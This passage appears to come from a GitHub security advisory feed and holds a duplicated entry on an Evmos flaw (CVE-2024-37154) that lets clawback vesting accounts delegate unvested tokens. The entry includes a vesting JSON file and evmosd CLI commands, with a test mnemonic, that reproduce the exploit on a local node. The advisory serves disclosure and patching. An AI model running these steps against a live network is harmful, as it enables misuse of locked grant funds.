<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v18] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
</feed>